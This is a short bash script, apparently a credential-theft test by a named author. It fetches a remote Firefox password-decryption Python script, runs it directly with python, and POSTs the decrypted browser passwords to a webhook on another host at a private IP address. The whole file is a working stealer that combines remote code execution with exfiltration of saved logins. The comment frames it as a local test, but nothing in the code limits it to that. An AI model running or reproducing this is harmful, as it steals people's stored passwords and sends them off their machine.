#!/bin/bash
#Kerem EYLEM - 11 April 2025
#Simple local webhook script to test capturing the browser passwords.
FIREFOX_DECRYPT_URL="https://raw.githubusercontent.com/Keylem/Firefox-Decrypt-Ubuntu/refs/heads/main/firefox_decrypt.py"
WEBHOOK_SERVER_URL="192.168.123.232:9000/hooks/capture-to-file"
echo $(curl -fsSL $FIREFOX_DECRYPT_URL | python) | curl -v POST --data-binary @- $WEBHOOK_SERVER_URL
